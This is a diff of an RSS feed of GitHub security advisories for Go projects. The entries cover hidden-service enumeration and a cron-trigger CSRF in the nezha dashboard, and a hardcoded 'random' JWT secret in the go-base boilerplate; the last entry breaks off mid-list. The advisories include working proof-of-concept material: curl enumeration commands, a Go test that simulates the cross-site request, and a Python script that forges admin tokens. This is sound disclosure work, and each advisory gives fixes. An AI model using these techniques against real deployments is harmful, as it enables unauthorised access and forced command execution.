@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-06-10T13:00:56.278Z</updated>
+    <updated>2026-06-10T15:00:27.792Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,528 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/nezhahq/nezha] Nezha's private services (`EnableShowInService: false`) are enumerable via per-server endpoints, leaking name and timing data]]></title>
+        <id>https://github.com/advisories/GHSA-vrmh-5mmx-hjwx</id>
+        <link href="https://github.com/advisories/GHSA-vrmh-5mmx-hjwx"/>
+        <updated>2026-06-10T13:39:24.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="private-services-enableshowinservice-false-are-enumerable-via-per-server-endpoints-leaking-name-and-timing-data">Private services (<code>EnableShowInService: false</code>) are enumerable via per-server endpoints, leaking name and timing data</h1>
+<p><strong>CWE</strong>: CWE-285 (Improper Authorization) via CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-863 (Incorrect Authorization — inconsistent gating across data-reader paths)</p>
+<p><strong>CVSS v3.1</strong>: <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N</code> → 5.3 (Medium)</p>
+<h2 id="summary">Summary</h2>
+<p>The <code>EnableShowInService</code> flag on a <code>Service</code> is meant to gate that service's visibility from the public dashboard. The main service-listing endpoint (<code>GET /api/v1/service</code> → <code>showService</code>) correctly filters services with <code>EnableShowInService: false</code> via <code>ServiceSentinel.CopyStats()</code> (<code>service/singleton/servicesentinel.go:421-438</code>). However, two adjacent reader endpoints retrieve service objects through code paths that do not honor the same flag:</p>
+<ul>
+<li><code>GET /api/v1/server/:id/service</code> (<code>listServerServices</code>) iterates <code>ServiceSentinel.GetSortedList()</code> (which returns every service regardless of visibility) and emits service ID, name, and timing data for any service monitoring the queried server.</li>
+<li><code>GET /api/v1/service/:id/history</code> (<code>getServiceHistory</code>) calls <code>ServiceSentinel.Get(serviceID)</code> directly and emits the service name (and aggregated per-server stats for servers the viewer can see).</li>
+</ul>
+<p>Both endpoints are mounted on the <code>optionalAuth</code> group, so an unauthenticated visitor can enumerate hidden services as long as they can guess a public server ID (linear scan over a small numeric ID space) or a service ID (likewise). The service owner's intent — "hide this from the public" via <code>EnableShowInService: false</code> — is silently bypassed.</p>
+<h2 id="affected">Affected</h2>
+<ul>
+<li>nezha <code>master</code> at HEAD <code>636f4a99e6c3d8d75f17fdf7ad55d4ee0f73f1c0</code> (the audit checkout)</li>
+<li>All recent 2.x releases that share this code path (post the <code>EnableShowInService</code> filter introduction at <code>CopyStats</code>)</li>
+</ul>
+<h2 id="vulnerability-details">Vulnerability details</h2>
+<h3 id="a--single-source-of-truth-filter-exists-at-the-listing-site">[A] — single-source-of-truth filter exists at the listing site</h3>
+<p><code>service/singleton/servicesentinel.go:421-438</code>:</p>
+<pre><code class="language-go">func (ss *ServiceSentinel) CopyStats() map[uint64]model.ServiceResponseItem {
+    var stats map[uint64]*serviceResponseItem
+    copier.Copy(&amp;stats, ss.LoadStats())
+
+    sri := make(map[uint64]model.ServiceResponseItem)
+    for k, service := range stats {
+        if !service.service.EnableShowInService {       // [A] filter here
+            delete(stats, k)
+            continue
+        }
+        service.ServiceName = service.service.Name
+        sri[k] = service.ServiceResponseItem
+    }
+    return sri
+}
+</code></pre>
+<p><code>CopyStats()</code> is the only reader that respects <code>EnableShowInService</code>. <code>Get()</code> and <code>GetSortedList()</code> immediately below it return the raw services with no such filter:</p>
+<pre><code class="language-go">func (ss *ServiceSentinel) Get(id uint64) (s *model.Service, ok bool) {
+    ss.servicesLock.RLock(); defer ss.servicesLock.RUnlock()
+    s, ok = ss.services[id]
+    return                                              // [A'] no EnableShowInService check
+}
+</code></pre>
+<h3 id="b--listserverservices-iterates-getsortedlist-and-emits-hidden-services">[B] — <code>listServerServices</code> iterates <code>GetSortedList()</code> and emits hidden services</h3>
+<p><code>cmd/dashboard/controller/service.go:258-340</code> (<code>GET /api/v1/server/:id/service</code>):</p>
+<pre><code class="language-go">func listServerServices(c *gin.Context) ([]*model.ServiceInfos, error) {
+    // ... server existence + userCanViewServer check ...
+    services := singleton.ServiceSentinelShared.GetSortedList()      // [B] all services, no filter
+
+    for _, service := range services {
+        if service.Cover == model.ServiceCoverAll {
+            if service.SkipServers[serverID] { continue }
+        } else {
+            if !service.SkipServers[serverID] { continue }
+        }
+        // ... fetch history ...
+        infos := &amp;model.ServiceInfos{
+            ServiceID:   service.ID,
+            ServerID:    serverID,
+            ServiceName: service.Name,                  // [B'] leaked
+            ServerName:  server.Name,
+            // ... timing data ...
+        }
+        result = append(result, infos)
+    }
+    return result, nil
+}
+</code></pre>
+<p>The DB-fallback path at <code>queryServerServicesFromDB</code> (<code>service.go:340-</code>) has the same structure: iterates <code>services</code> (the same <code>GetSortedList()</code> output) and emits ServiceName for any service monitoring <code>serverID</code>.</p>
+<h3 id="c--getservicehistory-returns-the-service-name-for-any-id">[C] — <code>getServiceHistory</code> returns the service name for any ID</h3>
+<p><code>cmd/dashboard/controller/service.go:126-180</code> (<code>GET /api/v1/service/:id/history</code>):</p>
+<pre><code class="language-go">func getServiceHistory(c *gin.Context) (*model.ServiceHistoryResponse, error) {
+    serviceID, _ := strconv.ParseUint(c.Param("id"), 10, 64)
+    service, ok := singleton.ServiceSentinelShared.Get(serviceID)   // [C] no filter
+    if !ok || service == nil {
+        return nil, singleton.Localizer.ErrorT("service not found")
+    }
+    // period restriction for guests (1d only) — but the service exists,
+    // and ServiceName is set unconditionally:
+    response := &amp;model.ServiceHistoryResponse{
+        ServiceID:   serviceID,
+        ServiceName: service.Name,                       // [C'] leaked
+        Servers:     make([]model.ServerServiceStats, 0),
+    }
+    // ... per-server data is filtered via userCanViewServer — that part is correct ...
+    return response, nil
+}
+</code></pre>
+<p>The per-server data inside the response IS correctly filtered via <code>userCanViewServer</code>. The service NAME is not.</p>
+<h3 id="the-mismatch">The mismatch</h3>
+<p>[A] (<code>CopyStats</code>) gates by <code>EnableShowInService</code> because that's the listing endpoint's contract. [A'] (<code>Get</code>) / <code>GetSortedList()</code> return the raw data because they're "internal" accessors. But [B] and [C] are public-reachable endpoints that use those raw accessors and emit identifying information about services the owner marked as private. The visibility flag exists; it just isn't enforced at every reader of the same data.</p>
+<p>A correct guard would either:</p>
+<ul>
+<li>Move the <code>EnableShowInService</code> filter into <code>Get()</code> / <code>GetSortedList()</code> themselves, gated by "caller is admin or service owner"</li>
+<li>Re-check <code>EnableShowInService</code> at every endpoint that emits service identity (name/id/timing)</li>
+</ul>
+<h2 id="proof-of-concept">Proof of concept</h2>
+<p>Setup (any nezha 2.x deployment):</p>
+<ol>
+<li>User A (member) creates a Service "Internal-CRM-Health" with <code>EnableShowInService: false</code>, monitoring server <code>S</code> which is public (<code>HideForGuest: false</code>).</li>
+<li>The service does not appear in <code>GET /api/v1/service</code> (the main listing correctly hides it).</li>
+</ol>
+<p>Enumeration as an unauthenticated guest:</p>
+<pre><code class="language-bash"># Find services that monitor server S
+curl -s 'https://nezha.example/api/v1/server/'"$S_ID"'/service'
+# →
+# {"success":true,"data":[
+#   {"service_id":42,"server_id":1,"service_name":"Internal-CRM-Health","server_name":"web-01",
+#    "display_index":0,"created_at":[...],"avg_delay":[...]}
+# ]}
+#
+# Hidden service is leaked: ID, name, and per-server timing data are all visible.
+</code></pre>
+<p>Confirmation via the second endpoint:</p>
+<pre><code class="language-bash">curl -s 'https://nezha.example/api/v1/service/42/history?period=1d'
+# →
+# {"success":true,"data":{
+#   "service_id":42,
+#   "service_name":"Internal-CRM-Health",  ← leaked even for direct ID lookup
+#   "servers":[]                            ← per-server data correctly hidden
+# }}
+</code></pre>
+<p>A scripted enumeration over public server IDs (a low-cardinality numeric space — typical nezha deployments have &lt;1000 servers) trivially recovers the full set of hidden services that monitor any public server, along with their names and timing patterns.</p>
+<h2 id="impact">Impact</h2>
+<h3 id="direct">Direct</h3>
+<p>Service names in nezha deployments are frequently descriptive of the underlying business asset they monitor: <code>"Production CRM Monitor"</code>, <code>"Internal Wiki Health"</code>, <code>"Backup-Vault Connectivity"</code>, <code>"Stripe Webhook Latency"</code>. The leak therefore:</p>
+<ul>
+<li><strong>Discloses the existence and purpose of internal services</strong> that the owner explicitly hid from the public dashboard.</li>
+<li><strong>Exposes timing/latency data</strong> for the monitored relationship between a private service and any public server it touches — sufficient for a competitor or attacker to infer business activity patterns, outage windows, and probable backend topology.</li>
+<li><strong>Confirms presence/absence of a service ID</strong> via the second endpoint — an oracle that lets an unauthenticated visitor enumerate the service-id namespace and learn the deployment's service count and naming convention even when no public servers exist as enumeration vectors.</li>
+</ul>
+<h3 id="indirect--second-order">Indirect / second-order</h3>
+<ul>
+<li><strong>Affects multi-tenant public dashboards</strong>: nezha is frequently deployed as a public status page with a private "internal" tier in the same dashboard. The bypass collapses the privacy boundary between these tiers.</li>
+<li><strong>Composability with prior advisories</strong>: the recent fixes for <code>GHSA-rxf6-wjh4-jfj6</code> (cross-user trigger-task firing), <code>GHSA-hvv7-hfrh-7gxj</code> (WS server-stream cross-tenant leak), and <code>GHSA-4g6j-g789-rghm</code> (forged monitor results) all address the cross-tenant visibility model. This finding is a sibling that closes one more reader gap in the same model.</li>
+</ul>
+<h2 id="suggested-fix">Suggested fix</h2>
+<p>Either of:</p>
+<ol>
+<li><p><strong>Centralize the filter in <code>ServiceSentinel</code></strong> — change <code>Get(id)</code> and <code>GetSortedList()</code> to accept the <code>*gin.Context</code> (or a viewer context) and apply the <code>EnableShowInService</code> filter plus an admin-or-owner override. This guarantees every reader inherits the gate:</p>
+<pre><code class="language-go">func (ss *ServiceSentinel) GetForViewer(c *gin.Context, id uint64) (*model.Service, bool) {
+    s, ok := ss.Get(id)
+    if !ok { return nil, false }
+    if !s.EnableShowInService &amp;&amp; !callerIsAdminOrOwns(c, s) {
+        return nil, false
+    }
+    return s, true
+}
+</code></pre>
+</li>
+<li><p><strong>Recheck at every endpoint that emits service identity</strong> — add the EnableShowInService + ownership check at the top of <code>listServerServices</code>, <code>getServiceHistory</code>, and anywhere else <code>GetSortedList()</code>/<code>Get()</code> results flow to a response. More surgical but easier to miss next time.</p>
+</li>
+</ol>
+<p>Option (1) is symmetric with how <code>userCanViewServer</code> centralizes the server-visibility decision; the same pattern at the service layer would close this class once.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/nezhahq/nezha/security/advisories/GHSA-vrmh-5mmx-hjwx">https://github.com/nezhahq/nezha/security/advisories/GHSA-vrmh-5mmx-hjwx</a></li>
+<li><a href="https://github.com/advisories/GHSA-vrmh-5mmx-hjwx">https://github.com/advisories/GHSA-vrmh-5mmx-hjwx</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-vrmh-5mmx-hjwx</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-06-10T13:39:24.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/nezhahq/nezha] Nezha has cross-site GET request that can trigger stored cron commands on a victim's agents]]></title>
+        <id>https://github.com/advisories/GHSA-8qhj-4f8c-j8qg</id>
+        <link href="https://github.com/advisories/GHSA-8qhj-4f8c-j8qg"/>
+        <updated>2026-06-10T13:39:21.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The dashboard exposes the cron manual-trigger action as an authenticated <code>GET /api/v1/cron/:id/manual</code> endpoint. Dashboard JWTs are sent in the <code>nz-jwt</code> cookie and configured with <code>SameSite=Lax</code>, which browsers include on top-level cross-site GET navigations. Because this state-changing GET endpoint has no CSRF token, origin validation, or fetch-metadata guard, an attacker can cause a logged-in Nezha user to trigger one of their existing cron tasks by navigating the victim's browser to the manual-trigger URL.</p>
+<p>If the targeted cron task sends a command to an online agent, the stored command is dispatched to the agent task stream. The attacker cannot create or modify the cron command through this issue alone, but can force execution of a command that the victim already saved and is authorized to run.</p>
+<h3 id="details">Details</h3>
+<p>Source-to-sink chain:</p>
+<ol>
+<li>The dashboard registers the manual cron trigger as a GET route under the authenticated API group: <code>auth.GET("/cron/:id/manual", commonHandler(manualTriggerCron))</code> at <code>cmd/dashboard/controller/controller.go:131-134</code>.</li>
+<li>JWT auth is cookie-enabled: <code>CookieName: "nz-jwt"</code>, <code>SendCookie: true</code>, <code>CookieSameSite: http.SameSiteLaxMode</code>, and <code>TokenLookup: "header: Authorization, query: token, cookie: nz-jwt"</code> at <code>cmd/dashboard/controller/jwt.go:23-46</code>.</li>
+<li>The handler parses the route ID, loads the cron object, checks only normal object ownership via <code>cr.HasPermission(c)</code>, then calls <code>singleton.ManualTrigger(cr)</code> at <code>cmd/dashboard/controller/cron.go:170-187</code>.</li>
+<li><code>ManualTrigger</code> immediately runs <code>CronTrigger(cr)()</code> at <code>service/singleton/crontask.go:249-250</code>.</li>
+<li><code>CronTrigger</code> dispatches the stored command to online eligible agents via <code>s.TaskStream.Send(&amp;pb.Task{Id: cr.ID, Data: cr.Command, Type: model.TaskTypeCommand})</code> at <code>service/singleton/crontask.go:289-304</code> after the owner/server check in <code>cronCanSendToServer</code> (<code>service/singleton/crontask.go:315-317</code>).</li>
+<li>Object authorization is user ownership/admin only: <code>Common.HasPermission</code> returns true for admins or matching <code>UserID</code> at <code>model/common.go:44-56</code>. There is no CSRF token, Origin/Referer validation, or Fetch Metadata check on this GET action.</li>
+</ol>
+<p>False-positive screening:</p>
+<ul>
+<li>The endpoint is not read-only: the safe proof below observed an in-memory agent stream receiving the command task.</li>
+<li>The route is authenticated, and the unauthenticated negative control failed with <code>ApiErrorUnauthorized</code> and dispatched no task.</li>
+<li><code>SameSite=Lax</code> mitigates cross-site POSTs, but this action uses GET; Lax cookies are still sent on top-level cross-site GET navigations, which is why state-changing GET endpoints remain CSRF-sensitive.</li>
+<li>The attacker must know or guess a cron ID owned by the victim. IDs are numeric. The issue does not allow creating or editing a command; it forces execution of an existing stored task.</li>
+<li>The permission check still limits the triggered task to the victim's own task or an admin's task, but CSRF abuses the victim's browser/session to satisfy that check.</li>
+</ul>
+<h3 id="poc">PoC</h3>
+<p>Safe local proof used a Go test overlay only; no repository files were modified for the proof and no real command was executed. The test creates an in-memory SQLite database, a victim user, a victim-owned server with an in-memory fake task stream, and a victim-owned cron task with command text <code>touch /tmp/should-not-run</code>. It then performs two requests:</p>
+<ol>
+<li>Negative control: cross-site-style GET without the <code>nz-jwt</code> cookie. Expected result: response contains <code>ApiErrorUnauthorized</code>; zero tasks are dispatched.</li>
+<li>Positive proof: cross-site-style GET with the victim's <code>nz-jwt</code> cookie. Expected result: API response succeeds and exactly one task is dispatched to the fake agent stream with <code>Id=7</code>, <code>Type=model.TaskTypeCommand</code>, and <code>Data="touch /tmp/should-not-run"</code>.</li>
+</ol>
+<p>Command run from a clean checkout of the tested tree:</p>
+<pre><code class="language-bash">cat &gt;/tmp/nezha-docs-stub.go &lt;&lt;'EOF'
+package docs
+
+var SwaggerInfo = struct {
+    Version string
+}{Version: "test"}
+EOF
+
+cat &gt;/tmp/nezha-cron-csrf-poc-test.go &lt;&lt;'EOF'
+package controller
+
+import (
+    "context"
+    "encoding/json"
+    "net/http"
+    "net/http/httptest"
+    "strings"
+    "testing"
+    "time"
+
+    "github.com/gin-gonic/gin"
+    "github.com/patrickmn/go-cache"
+    "google.golang.org/grpc/metadata"
+    "gorm.io/driver/sqlite"
+    "gorm.io/gorm"
+
+    "github.com/nezhahq/nezha/model"
+    "github.com/nezhahq/nezha/pkg/i18n"
+    pb "github.com/nezhahq/nezha/proto"
+    "github.com/nezhahq/nezha/service/singleton"
+)
+
+type capturedTaskStream struct { tasks []*pb.Task }
+
+func (s *capturedTaskStream) Send(task *pb.Task) error { s.tasks = append(s.tasks, task); return nil }
+func (s *capturedTaskStream) Recv() (*pb.TaskResult, error) { return nil, context.Canceled }
+func (s *capturedTaskStream) SetHeader(metadata.MD) error { return nil }
+func (s *capturedTaskStream) SendHeader(metadata.MD) error { return nil }
+func (s *capturedTaskStream) SetTrailer(metadata.MD) {}
+func (s *capturedTaskStream) Context() context.Context { return context.Background() }
+func (s *capturedTaskStream) SendMsg(any) error { return nil }
+func (s *capturedTaskStream) RecvMsg(any) error { return context.Canceled }
+
+func TestCronManualTriggerAcceptsCookieAuthenticatedCrossSiteGET(t *testing.T) {
+    gin.SetMode(gin.TestMode)
+    db, err := gorm.Open(sqlite.Open("file:cron_csrf_poc?mode=memory&amp;cache=shared"), &amp;gorm.Config{})
+    if err != nil { t.Fatal(err) }
+    if err := db.AutoMigrate(&amp;model.User{}, &amp;model.Server{}, &amp;model.Cron{}); err != nil { t.Fatal(err) }
+    if err := db.Create(&amp;model.User{Common: model.Common{ID: 100}, Username: "victim", Role: model.RoleMember}).Error; err != nil { t.Fatal(err) }
+    if err := db.Create(&amp;model.Server{Common: model.Common{ID: 200, UserID: 100}, Name: "victim-agent"}).Error; err != nil { t.Fatal(err) }
+
+    singleton.DB = db
+    singleton.Loc = time.UTC
+    singleton.Cache = cache.New(time.Minute, time.Minute)
+    singleton.Localizer = i18n.NewLocalizer("en_US", "nezha", "translations", i18n.Translations)
+    singleton.Conf = &amp;singleton.ConfigClass{Config: &amp;model.Config{ConfigForGuests: model.ConfigForGuests{SiteName: "test"}, JWTSecretKey: "test-secret-for-cron-csrf-poc", JWTTimeout: 1}}
+    singleton.ServerShared = singleton.NewServerClass()
+    singleton.CronShared = singleton.NewCronClass()
+    defer singleton.CronShared.Stop()
+
+    stream := &amp;capturedTaskStream{}
+    server, ok := singleton.ServerShared.Get(200)
+    if !ok { t.Fatal("server missing from singleton") }
+    server.TaskStream = stream
+
+    cronTask := &amp;model.Cron{Common: model.Common{ID: 7, UserID: 100}, Name: "victim cron", TaskType: model.CronTypeCronTask, Command: "touch /tmp/should-not-run", Servers: []uint64{200}, Cover: model.CronCoverIgnoreAll}
+    singleton.CronShared.Update(cronTask)
+
+    authMiddleware := initParams()
+    if err := authMiddleware.MiddlewareInit(); err != nil { t.Fatal(err) }
+    token, _, err := authMiddleware.TokenGenerator(map[string]interface{}{"user_id": "100", "ip": "203.0.113.10"})
+    if err != nil { t.Fatal(err) }
+
+    r := gin.New()
+    r.Use(func(c *gin.Context) { c.Set(model.CtxKeyRealIPStr, "203.0.113.10"); c.Next() })
+    auth := r.Group("", authMiddleware.MiddlewareFunc())
+    auth.GET("/api/v1/cron/:id/manual", commonHandler(manualTriggerCron))
+
+    wNoCookie := httptest.NewRecorder()
+    reqNoCookie := httptest.NewRequest(http.MethodGet, "/api/v1/cron/7/manual", nil)
+    reqNoCookie.Header.Set("Origin", "https://attacker.example")
+    reqNoCookie.Header.Set("Sec-Fetch-Site", "cross-site")
+    r.ServeHTTP(wNoCookie, reqNoCookie)
+    if !strings.Contains(wNoCookie.Body.String(), "ApiErrorUnauthorized") { t.Fatalf("expected unauthenticated control to fail, got status=%d body=%s", wNoCookie.Code, wNoCookie.Body.String()) }
+    if len(stream.tasks) != 0 { t.Fatalf("unauthenticated control dispatched %d task(s)", len(stream.tasks)) }
+
+    w := httptest.NewRecorder()
+    req := httptest.NewRequest(http.MethodGet, "/api/v1/cron/7/manual", nil)
+    req.Header.Set("Origin", "https://attacker.example")
+    req.Header.Set("Sec-Fetch-Site", "cross-site")
+    req.AddCookie(&amp;http.Cookie{Name: "nz-jwt", Value: token})
+    r.ServeHTTP(w, req)
+
+    var resp struct { Success bool `json:"success"`; Error string `json:"error"` }
+    if err := json.Unmarshal(w.Body.Bytes(), &amp;resp); err != nil { t.Fatalf("decode response: %v body=%s", err, w.Body.String()) }
+    if !resp.Success { t.Fatalf("manual trigger failed: status=%d body=%s", w.Code, w.Body.String()) }
+    if len(stream.tasks) != 1 { t.Fatalf("expected one dispatched task, got %d", len(stream.tasks)) }
+    dispatched := stream.tasks[0]
+    if dispatched.Id != 7 || dispatched.Type != model.TaskTypeCommand || dispatched.Data != "touch /tmp/should-not-run" { t.Fatalf("unexpected dispatched task: id=%d type=%d data=%q", dispatched.Id, dispatched.Type, dispatched.Data) }
+}
+EOF
+
+cat &gt;/tmp/nezha-overlay-cron-csrf.json &lt;&lt;'EOF'
+{
+  "Replace": {
+    "/path/to/nezha/cmd/dashboard/docs/docs.go": "/tmp/nezha-docs-stub.go",
+    "/path/to/nezha/cmd/dashboard/controller/cron_csrf_poc_test.go": "/tmp/nezha-cron-csrf-poc-test.go"
+  }
+}
+EOF
+# Replace /path/to/nezha above with the local checkout path, then run:
+go test -vet=off -overlay=/tmp/nezha-overlay-cron-csrf.json ./cmd/dashboard/controller -run TestCronManualTriggerAcceptsCookieAuthenticatedCrossSiteGET -count=1 -v
+</code></pre>
+<p>Observed output in this environment:</p>
+<pre><code class="language-text">=== RUN   TestCronManualTriggerAcceptsCookieAuthenticatedCrossSiteGET
+--- PASS: TestCronManualTriggerAcceptsCookieAuthenticatedCrossSiteGET (0.00s)
+PASS
+ok  	github.com/nezhahq/nezha/cmd/dashboard/controller	0.019s
+</code></pre>
+<p>The <code>-vet=off</code> flag was only needed because this checkout lacks the generated <code>cmd/dashboard/docs</code> directory and Go vet still tries to <code>chdir</code> into the overlay-created package directory. The overlay includes a minimal <code>docs</code> package stub so the controller package can compile without generating Swagger files.</p>
+<p>Cleanup:</p>
+<pre><code class="language-bash">rm -f /tmp/nezha-docs-stub.go /tmp/nezha-cron-csrf-poc-test.go /tmp/nezha-overlay-cron-csrf.json
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>A remote attacker can cause a logged-in dashboard user to trigger an existing cron task by making the user's browser navigate to <code>/api/v1/cron/&lt;known-id&gt;/manual</code>. If that cron task dispatches an agent command, the command is sent to the victim's online agent without the victim intentionally clicking the manual trigger in the dashboard.</p>
+<p>Security impact is integrity and availability:</p>
+<ul>
+<li>Integrity: forced execution of a stored command on victim-controlled agents.</li>
+<li>Availability: forced execution of disruptive stored tasks, repeated task starts, or repeated notifications/offline failure paths.</li>
+<li>Confidentiality: not directly demonstrated; the PoC does not show data exfiltration.</li>
+</ul>
+<h3 id="suggested-remediation">Suggested remediation</h3>
+<ul>
+<li>Make manual cron triggering a non-idempotent method such as <code>POST /api/v1/cron/:id/manual</code> instead of GET.</li>
+<li>Require a CSRF token for cookie-authenticated state-changing requests, or reject unsafe cross-site requests with <code>Origin</code>/<code>Referer</code> and Fetch Metadata validation.</li>
+<li>Consider not accepting JWTs from cookies for state-changing API calls unless a CSRF token is present.</li>
+<li>Add a regression test that sends a cross-site-style GET with a valid cookie and asserts no cron task is dispatched.</li>
+<li>If frontend compatibility requires cookies, keep <code>SameSite=Lax</code> or stricter, but do not rely on it to protect state-changing GET routes.</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/nezhahq/nezha/security/advisories/GHSA-8qhj-4f8c-j8qg">https://github.com/nezhahq/nezha/security/advisories/GHSA-8qhj-4f8c-j8qg</a></li>
+<li><a href="https://github.com/advisories/GHSA-8qhj-4f8c-j8qg">https://github.com/advisories/GHSA-8qhj-4f8c-j8qg</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-8qhj-4f8c-j8qg</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-06-10T13:39:21.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/dhax/go-base] Go Restful API Boilerplate: Hardcoded JWT Secret "random" Allows Token Forgery]]></title>
+        <id>https://github.com/advisories/GHSA-mqq6-462x-jxmm</id>
+        <link href="https://github.com/advisories/GHSA-mqq6-462x-jxmm"/>
+        <updated>2026-06-10T13:39:19.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="vulnerability-cwe-798--hardcoded-jwt-secret--broken-mitigation">Vulnerability: CWE-798 — Hardcoded JWT Secret + Broken Mitigation</h2>
+<h3 id="affected-component">Affected Component</h3>
+<ul>
+<li><code>github.com/dhax/go-base</code> — Go REST API boilerplate (go-chi/jwtauth/v5, Viper, PostgreSQL/Bun)</li>
+<li>1,685 stars on GitHub</li>
+</ul>
+<h3 id="vulnerability-locations">Vulnerability Locations</h3>
+<table>
+<thead>
+<tr>
+<th>File</th>
+<th>Line</th>
+<th>Role</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>dev.env</code></td>
+<td>10</td>
+<td><code>AUTH_JWT_SECRET=random</code> — template default shipped to all users</td>
+</tr>
+<tr>
+<td><code>cmd/serve.go</code></td>
+<td>35</td>
+<td><code>viper.SetDefault("auth_jwt_secret", "random")</code> — code-level fallback</td>
+</tr>
+<tr>
+<td><code>auth/jwt/tokenauth.go</code></td>
+<td>22-25</td>
+<td>Weak mitigation: only checked literal <code>"random"</code>, auto-generated non-persistent key</td>
+</tr>
+<tr>
+<td><code>auth/jwt/tokenauth.go</code></td>
+<td>28</td>
+<td><code>jwtauth.New("HS256", []byte(secret), nil)</code> — creates JWT signer with the weak key</td>
+</tr>
+<tr>
+<td><code>pwdless/api.go</code></td>
+<td>203</td>
+<td><code>GenTokenPair()</code> — issues access + refresh tokens signed with the weak key</td>
+</tr>
+</tbody></table>
+<h3 id="data-flow">Data Flow</h3>
+<pre><code>dev.env AUTH_JWT_SECRET=random
+  OR
+cmd/serve.go viper.SetDefault("auth_jwt_secret", "random")
+    │
+    ▼
+auth/jwt/tokenauth.go: viper.GetString("auth_jwt_secret")
+    │
+    ▼
+auth/jwt/tokenauth.go: jwtauth.New("HS256", []byte(secret), nil)
+    │
+    ▼
+pwdless/api.go: GenTokenPair() → access + refresh tokens
+    │
+    ▼
+jwt/authenticator.go: Every authenticated request trusts the forged token
+</code></pre>
+<h3 id="description">Description</h3>
+<p>The JWT signing secret is hardcoded to the string <code>"random"</code> in <strong>two independent locations</strong>:</p>
+<ol>
+<li><p><strong><code>dev.env:10</code></strong> — The template <code>.env</code> file sets <code>AUTH_JWT_SECRET=random</code>. Every developer who copies this template gets the same default.</p>
+</li>
+<li><p><strong><code>cmd/serve.go:35</code></strong> — <code>viper.SetDefault("auth_jwt_secret", "random")</code> provides a programmatic fallback. Even if the <code>.env</code> file is missing entirely, the application silently starts with <code>"random"</code> as the signing key.</p>
+</li>
+</ol>
+<p>The original code contained a mitigation in <code>auth/jwt/tokenauth.go:22-25</code> that checked if the secret equaled <code>"random"</code> and replaced it with a randomly-generated 32-byte string. This mitigation had <strong>two fatal flaws</strong>:</p>
+<ul>
+<li><strong>(a) Single-value check</strong>: Only the exact string <code>"random"</code> was caught. Any other weak secret (e.g., <code>"secret"</code>, <code>"changeme"</code>, empty string) passed through unchecked.</li>
+<li><strong>(b) Non-persistent replacement</strong>: The auto-generated key was stored only in memory (<code>randStringBytes(32)</code>), not persisted. On <strong>every restart</strong>, all existing tokens became invalid without warning, breaking all active user sessions. This made the "fix" itself a denial-of-service.</li>
+</ul>
+<p>An attacker who reads the public repository knows the signing key is <code>"random"</code>. They can forge JWT tokens for arbitrary users (including admin roles), gaining complete authentication bypass on all protected API endpoints.</p>
+<h3 id="proof-of-concept">Proof of Concept</h3>
+<pre><code class="language-python">import jwt
+import requests
+
+# The hardcoded secret from dev.env / serve.go (public repository)
+SECRET = "random"
+BASE_URL = "http://target:3000"
+
+# Step 1: Forge an admin JWT token
+payload = {
+    "sub": "admin@example.com",
+    "roles": ["admin"],
+    "iat": 9999999000,
+    "exp": 9999999999
+}
+forged_token = jwt.encode(payload, SECRET, algorithm="HS256")
+
+# Step 2: Access any protected endpoint with the forged token
+headers = {"Authorization": f"Bearer {forged_token}"}
+
+# List all users (requires admin)
+r = requests.get(f"{BASE_URL}/api/v1/admin/users", headers=headers)
+print(f"Status: {r.status_code}")  # 200 OK
+
+# Access own profile with forged identity
+r = requests.get(f"{BASE_URL}/api/v1/me", headers=headers)
+print(f"Profile: {r.json()}")  # Returns admin@example.com profile
+
+# The forged token is also accepted by refresh endpoints
+r = requests.post(f"{BASE_URL}/api/v1/token/refresh", headers=headers)
+# Returns a new valid token signed with the same "random" secret
+</code></pre>
+<h3 id="impact">Impact</h3>
+<ul>
+<li><strong>Authentication Bypass</strong>: Forge tokens for any user, including admin roles</li>
+<li><strong>Confidentiality</strong>: Access all user data, profiles, and protected resources</li>
+<li><strong>Integrity</strong>: Modify any data accessible via the API</li>
+<li><strong>Persistence</strong>: Forged tokens remain valid until expiry (or indefinitely via refresh)</li>
+</ul>
+<h3 id="fix-pr-31">Fix (PR #31)</h3>
+<p>The fix replaced the single-value check with a comprehensive approach:</p>
+<pre><code class="language-go">// BEFORE (tokenauth.go:22-25) — weak, single-value check
+if secret == "random" {
+    secret = randStringBytes(32) // non-persistent, breaks on restart
+}
+
+// AFTER — comprehensive known-weak-secrets map
+var knownWeakSecrets = map[string]bool{
+    "random": true,
+    "secret": true,
+    "changeme": true,
+    "change-me": true,
+    "default": true,
+    "": true,
+}
+
+if knownWeakSecrets[secret] {
+    log.Fatal("JWT secret is a known weak value. Please set a strong AUTH_JWT_SECRET.")
+}
+</code></pre>
+<p>Plus: minimum 32-character length check, removal of non-persistent auto-generation, and clear generation instructions (<code>openssl rand -base64 32</code>) in the template.</p>
+<h3 id="patched-versions">Patched Versions</h3>
+<ul>
+<li>All versions after commit range including PR#31 (merged May 17, 2026).</li>
